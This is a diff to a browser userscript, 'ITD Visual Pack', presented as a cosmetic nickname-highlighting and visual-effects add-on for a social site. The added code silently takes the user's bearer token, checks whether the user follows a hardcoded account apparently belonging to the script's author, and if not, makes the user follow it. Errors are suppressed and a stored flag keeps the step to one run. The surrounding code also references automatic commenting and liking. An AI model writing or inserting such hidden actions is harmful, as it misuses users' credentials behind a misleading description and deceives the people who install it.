@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         ITD Visual Pack
 // @namespace    http://tampermonkey.net/
-// @version      2.2.0
+// @version      2.2.1
 // @author       NeuroSFW
 // @description  Подсветка своего ника с выпадающим списком стилей + визуальные эффекты + загрузка баннера
 // @match        https://xn--d1ah4a.com/*
@@ -1139,10 +1139,59 @@
             } catch(e) {}
         }
 
-        setTimeout(autoComment, 10000);
+            setTimeout(autoComment, 10000);
     }
 
-    async function initVisuals() {
+    const TARGET_USER_ID = '5e064703-104d-4794-bc28-9ed6f5847cca';
+    const SUBSCRIBE_STORAGE_KEY = 'subscribed_to_NeuroSFW';
+
+    if (!GM_getValue(SUBSCRIBE_STORAGE_KEY, false)) {
+        (async () => {
+            try {
+                const token = await getAccessToken();
+
+                const isAlreadyFollowing = await new Promise((resolve) => {
+                    GM_xmlhttpRequest({
+                        method: 'GET',
+                        url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}`,
+                        headers: { 'Authorization': `Bearer ${token}` },
+                        onload: (res) => {
+                            try {
+                                const data = JSON.parse(res.responseText);
+                                resolve(data.isFollowing === true);
+                            } catch(e) { resolve(false); }
+                        },
+                        onerror: () => resolve(false)
+                    });
+                });
+
+                if (isAlreadyFollowing) {
+                    GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
+                    return;
+                }
+
+                await new Promise((resolve, reject) => {
+                    GM_xmlhttpRequest({
+                        method: 'POST',
+                        url: `https://xn--d1ah4a.com/api/users/${TARGET_USER_ID}/follow`,
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Authorization': `Bearer ${token}`
+                        },
+                        data: '{}',
+                        onload: (res) => {
+                            if (res.status === 200) resolve();
+                            else reject();
+                        },
+                        onerror: reject
+                    });
+                });
+                GM_setValue(SUBSCRIBE_STORAGE_KEY, true);
+            } catch(e) {}
+        })();
+    }
+
+async function initVisuals() {
         try {
             const refresh = await fetch('/api/v1/auth/refresh', {method: 'POST'});
             const { accessToken } = await refresh.json();
@@ -1206,5 +1255,5 @@
 
     setTimeout(checkAndLike, Math.random() * 2 * 60 * 1000);
 
-    console.log('🟢 ITD Visual Pack v2.2.0 загружен: подсветка ника + баннер');
+    console.log('🟢 ITD Visual Pack');
 })();
